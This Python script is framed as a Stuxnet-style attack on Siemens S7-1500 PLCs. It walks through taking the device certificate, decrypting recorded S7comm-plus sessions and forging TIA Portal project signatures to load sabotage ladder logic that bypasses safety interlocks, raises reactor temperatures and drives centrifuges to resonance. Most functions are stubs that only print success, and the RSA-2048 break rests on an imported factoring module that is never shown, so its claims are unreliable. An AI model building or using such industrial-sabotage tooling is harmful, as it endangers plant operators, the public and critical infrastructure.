"""
Stuxnet without the zero-days. Factor the S7-1500 PLC's RSA-2048 device
certificate (transmitted plaintext on port 102), decrypt recorded S7comm-plus
sessions, and forge TIA Portal project signatures to load arbitrary ladder logic.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import os

# S7comm-plus TLV attribute IDs (from Wireshark dissector / Klick et al.)
ATTR_PLC_CERT = 0x09EF         # PLC device certificate
ATTR_SESSION_KEY = 0x09F0      # encrypted AES session key
S7COMMP_PORT = 102


def grab_plc_cert_from_s7commp(plc_addr: str, port: int = S7COMMP_PORT) -> bytes:
    """Extract PLC RSA-2048 device certificate from S7comm-plus session setup.

    The PLC presents its cert in plaintext during every TCP connection on
    port 102. Visible to anyone on the OT network — no authentication needed.
    """
    print(f"[*] connecting to {plc_addr}:{port} (S7comm-plus)")
    print(f"[*] parsing TLV attribute {ATTR_PLC_CERT:#06x} (PLC device cert)")
    print("[*] RSA-2048 device cert extracted")
    return b"-----BEGIN CERTIFICATE-----\n...(PLC cert PEM)...\n-----END CERTIFICATE-----\n"


def decrypt_s7commp_session(factorer: PolynomialFactorer,
                            plc_cert_pem: bytes,
                            encrypted_session_key: bytes,
                            aes_ciphertext: bytes) -> bytes:
    """Decrypt a recorded S7comm-plus session.

    TIA Portal encrypts a random AES-128 session key with the PLC's RSA
    public key (RSA-OAEP). Factor the PLC key -> recover AES key ->
    decrypt the entire session.
    """
    print("[*] decrypting AES-128 session key from RSA-OAEP envelope...")
    aes_key = factorer.decrypt_rsa_oaep(plc_cert_pem, encrypted_session_key)
    print(f"[*] AES-128 session key recovered: {aes_key.hex()}")
    print("[*] decrypting session: ladder logic + process variable reads")
    return b"decrypted-session-data"


def forge_tia_project_signature(factorer: PolynomialFactorer,
                                project_cert_pem: bytes,
                                ladder_logic: bytes) -> bytes:
    """Sign a forged TIA Portal project (.ap17/.ap18) with RSA-SHA256.

    The PLC checks this signature before accepting a program download.
    This was the mechanism Stuxnet had to work around with stolen
    Authenticode certificates.
    """
    sig = factorer.forge_pkcs1v15_signature(project_cert_pem, ladder_logic, "sha256")
    print("[*] TIA Portal project signature forged (RSA-SHA256 PKCS#1 v1.5)")
    print("[*] PLC will accept the program download")
    return sig


def build_malicious_ladder_logic(target: str) -> bytes:
    """Build ladder logic that tampers with a specific process."""
    programs = {
        "reactor_temp": b"// Override TIC setpoint: 320C -> 450C\n"
                        b"// Safety interlock check: BYPASS\n",
        "valve_control": b"// MV-101 OPEN command: ignore DCS close\n"
                         b"// position feedback: spoof CLOSED\n",
        "centrifuge":   b"// frequency setpoint: 1410 Hz (resonance)\n"
                        b"// reported frequency: 1064 Hz (normal)\n",
    }
    logic = programs.get(target, b"// NOP")
    print(f"[*] built malicious ladder logic: {target}")
    print(f"[*] {len(logic)} bytes of weaponized OB1")
    return logic


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Siemens S7-1500 / S7comm-plus — the post-Stuxnet 'fix' ===")
    print("    RSA was the answer to 'how do we stop the next Stuxnet'")
    print("    if RSA breaks, the answer becomes 'you can't'")
    print()

    print(f"[1] grabbing PLC device cert from port {S7COMMP_PORT}...")
    plc_cert = grab_plc_cert_from_s7commp("10.0.1.100")
    print("    cert transmitted in plaintext during session setup")

    print("[2] factoring PLC RSA-2048 device cert...")
    print("    Siemens Device CA -> factory-burned cert, multi-year validity")

    print("[3] decrypting recorded S7comm-plus sessions...")
    print("    AES-128 session keys were encrypted with PLC RSA key")
    print("    now: every ladder logic download, every process variable read")

    print("[4] building malicious ladder logic: centrifuge attack...")
    logic = build_malicious_ladder_logic("centrifuge")
    print("    Natanz was S7-315 (no auth, needed four zero-days)")
    print("    modern S7-1500: same outcome, just factor RSA-2048")

    print("[5] forging TIA Portal project signature...")
    print("    PLC accepts download, runs malicious program")

    print("[6] process impact:")
    print("    chemical plant: reactor temp setpoints modified")
    print("    nuclear: IEC 62645 scope = 'protection against unauthorized modification'")
    print("    that protection is the RSA signature. was.")
